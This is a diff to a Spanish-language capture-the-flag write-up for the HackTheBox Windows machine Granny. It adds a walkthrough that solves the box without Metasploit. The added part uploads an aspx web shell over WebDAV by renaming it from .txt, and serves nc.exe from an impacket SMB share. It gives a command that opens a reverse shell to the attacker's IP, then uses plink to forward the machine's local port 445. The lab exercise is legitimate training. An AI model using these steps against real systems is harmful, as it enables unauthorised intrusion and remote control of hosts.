@@ -17,6 +17,8 @@ tags:
   - User
   - Metasploit
   - OSCP
+  - PortForwarding
+  - cadaver
 ---
 
 granny corresponde a una maquina windows de nivel facil tanto en el user como en el root.
@@ -31,8 +33,8 @@ muchos usuarios usaron metasploit para esta maquina, sin embargo se intentara ex
 ## Introduccion
 
 Segun la comunidad podemos ver que Granny tiene un nivel "facil".
-![](/TheusZero/images/post/WindowsMachines/Devel/2.png)
-![](/TheusZero/images/post/WindowsMachines/Devel/3.png)
+![](/TheusZero/images/post/WindowsMachines/Granny/2.png)
+![](/TheusZero/images/post/WindowsMachines/Granny/3.png)
 
 ## Enumeracion
 
@@ -93,7 +95,7 @@ Microsoft IIS 6.0 / 7.5 (+ PHP) - Multiple Vulnerabilities                | ./wi
 -------------------------------------------------------------------------- ----------------------------------
 ```
 
-volviendo al nmap tenemos un supuesto WebDAV type funcionando, por lo cual nos podria venir bien algun exploit en el modulo de metasploit.
+volviendo al nmap tenemos un supuesto WebDAV type funcionando, webDav es un gestor de archivos que denomina como se deben escribir e interpretar archivos dentro de un servidor web, como eliminar o mover archivos o **renombrar**, por lo cual nos podria venir bien algun exploit en el modulo de metasploit.
 
 aqui lo haremos de dos formas, una por Metasploit y otra explicada sin metasploit.
 
@@ -311,6 +313,74 @@ Ejecución de exploit sugerido.
   nt authority\system
 ```
 
-
+listo, somos usuarios root en la maquina.
 
 ## OSCP
+
+version OSCP, sin metasploit, es mucho mas compleja pero si uno sabe usar las herramientas como el pivoting a su favor puede hacerlo de manera facil.
+Yo no tenia idea de como hacer **Port Forwarding**  desde una maquina windows y con bajos permisos. 
+
+nos copiamos la gran **aspx_cmd.aspx** y le cambiamos la extension a txt para que el servidor lo interprete como un archivo .txt que no sea malicioso.
+
+usando **cadaver** nos autenticamos en el servidor usando:
+
+> cadaver es un commandline que trabaja con WebDav y se instala con apt-get
+>> [LIBRERIA DE USO Y EXAMPLES](https://github.com/hpcloud/swift-webdav/blob/master/doc/Cadaver.md)
+
+ENTONCES:
+> cadaver 10.10.10.15
+
+subimos el archivo creado .txt con un put via cadaver y le cambiamos ahi mismo el nombre con MOVE a extension .aspx
+
+#### comunicacion con el servidor
+
+nos montamos un servidor en samba para comunicarnos con el servidor y pasar el binario de netcat para entablar una reverse shell un poco mas segura, entonces con
+
+```Python
+impacket-smbserver smbFolder $(pwd)
+```
+
+nos montamos un servidor samba simple y debemos generar la conexion con 
+```
+start /b \\MYIP\smbFolder\nc.exe -e cmd MYIP (443PORT)
+```
+
+#### privesec
+
+realizamos un ```netstat -nat``` para ver los puertos abiertos de la maquina como tal tanto local como a la escucha del servidor 
+
+![](/TheusZero/images/post/WindowsMachines/Granny/4.png)
+
+vemos que tenemos un puerto 445 samba abierto localmente por lo que intentaremos hacer el port forwarding para acceder al samba.
+
+para ello primero debemos localizar el plink.exe de nuestra maquina.
+
+```Python
+locate pliink.exe
+```
+
+lo copiamos en nuestra maquina e intentamos subirlo a la maquina granny que podria ser mediante el samba como lo hicimos antes.
+
+#### port fowarding
+
+hay que configurar el sshd_config en /etc/ssh/sshd_config hay que configurar un apartado en especifico que se llama permitRootLogin
+
+quedaria de la siguiente manera:
+
+![](/TheusZero/images/post/WindowsMachines/Granny/5.png)
+
+ahora, esto se ejecuta como admin o sudo
+
+> en mi maquina abro un server ssh con ```service ssh start```
+
+en la maquina windows con plink genero el pivoting con el siguiente comando:
+
+```Python
+plink.exe -l root -pw contrasena -R 445:127.0.0.1:445 MYIP
+```
+
+cuando ya este listo el pivoting, usaremos crackMapExec
+
+> 
+
+
